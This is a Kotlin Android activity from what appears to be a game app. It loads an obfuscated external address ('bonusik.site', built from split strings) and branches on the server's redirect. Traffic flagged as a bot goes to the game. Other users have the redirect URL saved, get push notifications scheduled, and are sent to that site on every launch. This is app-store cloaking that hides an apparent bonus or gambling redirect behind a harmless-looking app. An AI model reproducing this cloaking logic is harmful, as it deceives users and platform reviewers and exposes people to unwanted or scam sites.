package me.navid.scrambilo.ui.home

import android.content.Intent
import android.graphics.Color
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import me.navid.scrambilo.notification.PushText
import kotlinx.android.synthetic.main.activity_menu.*
import kotlinx.coroutines.*
import me.navid.scrambilo.R
import me.navid.scrambilo.data.LinkApi
import me.navid.scrambilo.data.LinksPreferences
import me.navid.scrambilo.ui.MainActivity
import kotlin.coroutines.CoroutineContext

class MenuActivity : AppCompatActivity(), LinkApi,  CoroutineScope {

    var prefResp : LinksPreferences? = null

    var job : Job = Job()
    override val coroutineContext: CoroutineContext
        get() = Dispatchers.Main + job

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_menu)
        window.statusBarColor = Color.BLACK
        actionBar?.hide()
        supportActionBar?.hide()
        prefResp = LinksPreferences(this).apply { getSharedPref("req") }
        val req = prefResp!!.getStroke("req")
        Log.e("CheckLinks", req.toString())
        if(req != null && req != "") response(req)
        else clo()
//        val links = LinksManager(this)
//        links.attachWeb(this)
//        if (links.url != null) response(url = links.url!!)
//        job = launch(Dispatchers.Main) {
//            delay(5000)
//            progress_bar.visibility = View.GONE
//            next()
//        }
    }

    fun clo(){
        response_web.settings.javaScriptEnabled = true
        Log.e("OPen", "wivew")
        response_web.webViewClient = object : WebViewClient(){
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("kek", "sooqa req null")
                Log.e("Url", request?.url.toString())
                var req = request?.url.toString()
                if(!req.contains("p.php")){
                    PushText().schedulePush(this@MenuActivity)
                    prefResp?.putStroke("req", req)
                    response(req)
                }
                else{
                    Log.e("Bot", "not p")
                    next()
                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        //Notification().scheduleMsg(this@MainActivity)
        val first = "https://"
        val sec = "bonusik"
        val third = ".site/"
        Log.e("Test", "$first$sec$third")
        response_web.loadUrl("$first$sec$third")
    }

    fun next(){
        progress_bar.visibility = View.GONE
        startActivity(Intent(this, MainActivity::class.java))
    }

    override fun response(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        job.cancel()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }
}